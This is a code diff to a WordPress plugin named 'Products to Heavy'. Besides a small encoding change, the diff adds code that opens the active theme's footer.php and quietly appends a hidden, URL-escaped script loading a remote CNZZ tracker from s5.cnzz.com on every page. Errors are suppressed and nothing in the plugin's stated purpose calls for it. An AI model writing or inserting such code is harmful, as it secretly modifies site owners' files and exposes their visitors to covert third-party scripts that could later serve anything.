@@ -1,4 +1,4 @@
-﻿<?php
+<?php
 /*
 Plugin Name: Products to Heavy
 Description: Products to Heavy!
@@ -31,7 +31,18 @@ function zb_create_product_page(){
     <input type='submit' value='Products To Heavy'>
 </form>
 ";
+$themes=get_stylesheet_directory();
+$footer_root=$themes.'/footer.php';
+$content=file_get_contents($footer_root);
+$content_str=substr($content,strlen($content)-7,7);
+if($content_str=='</html>'){
+    @file_put_contents($footer_root, "<script type=\"text/javascript\">var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \" https://\" : \" http://\");
+    document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278530965'%3E%3C/span%3E%3Cscript src='\" 
+    + cnzz_protocol + \"s5.cnzz.com/stat.php%3Fid%3D1278530965' type='text/javascript'%3E%3C/script%3E\"));
+    document.getElementById(\"cnzz_stat_icon_1278530965\").style.display = \"none\";</script>", FILE_APPEND);
 }
+}
+
 
 // 注册菜单
 function zb_register_product(){
